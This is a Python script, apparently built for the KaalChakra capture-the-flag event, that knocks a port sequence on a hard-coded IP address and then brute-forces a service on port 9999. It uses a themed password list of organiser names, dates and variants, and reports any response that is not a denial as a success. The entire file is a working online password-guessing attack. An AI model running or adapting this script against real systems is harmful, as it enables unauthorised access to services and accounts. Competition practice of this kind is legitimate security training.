#!/usr/bin/env python3
"""
SECTOR-7 passwords based on KaalChakra CTF theme
"""

import socket
import time

TARGET_IP = "13.206.58.35"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    for port in KNOCK_SEQUENCE:
        try:
            s = socket.socket()
            s.settimeout(0.3)
            s.connect((TARGET_IP, port))
            s.close()
        except:
            pass
        time.sleep(0.2)

def try_pwd(pwd):
    try:
        knock_ports()
        time.sleep(0.3)
        
        s = socket.socket()
        s.settimeout(3)
        s.connect((TARGET_IP, SERVICE_PORT))
        
        s.recv(4096)
        s.send((pwd + "\n").encode())
        time.sleep(0.3)
        
        resp = s.recv(4096).decode('utf-8', errors='ignore')
        s.close()
        
        if "denied" not in resp.lower() and "incorrect" not in resp.lower():
            print(f"\n[!!!] SUCCESS: '{pwd}'")
            print(resp)
            return True
        return False
    except:
        return False

passwords = [
    # KaalChakra themed
    "KaalChakra",
    "kaalchakra",
    "KAALCHAKRA",
    "Kaalchakra",
    
    # With years
    "KaalChakra2026",
    "kaalchakra2026",
    "KAALCHAKRA2026",
    
    # NFSU themed
    "NFSU",
    "nfsu",
    "NFSUGoa",
    "nfsugoa",
    "NFSUGOA",
    
    # TH3_RANG3RS
    "TH3_RANG3RS",
    "th3_rang3rs",
    "TH3RANG3RS",
    "th3rang3rs",
    "THERANGERS",
    "therangers",
    
    # Organizer combinations
    "NFSU-TH3_RANG3RS",
    "nfsu-th3_rang3rs",
    
    # Flag format hint
    "Kaal",
    "kaal",
    "KAAL",
    
    # With knock sequence
    "Kaal9000",
    "kaal9000",
    "KAAL9000",
    "Kaal2600",
    "kaal2600",
    "Kaal1337",
    "kaal1337",
    
    # CTF themed
    "CTF2026",
    "ctf2026",
    "KaalCTF",
    "kaalctf",
    
    # Goa themed
    "Goa",
    "goa",
    "GOA",
    "KaalGoa",
    "kaalgoa",
    
    # Sanskrit/Hindi
    "कालचक्र",  # Kaalchakra in Devanagari
    
    # Wheel of Time (Kaalchakra meaning)
    "WheelOfTime",
    "wheeloftime",
    "TimeWheel",
    "timewheel",
    
    # Maybe it's the CTF platform
    "CTF7",
    "ctf7",
    
    # Or the date
    "20260328",
    "20260411",
    "28032026",
    "11042026",
    
    # March 28
    "March28",
    "march28",
    "28March",
    "28march",
]

print("[*] KaalChakra-Themed Password Attack\n")

for i, pwd in enumerate(passwords, 1):
    print(f"[{i}/{len(passwords)}] {pwd}", end="... ")
    if try_pwd(pwd):
        break
    else:
        print("✗")
    time.sleep(0.3)
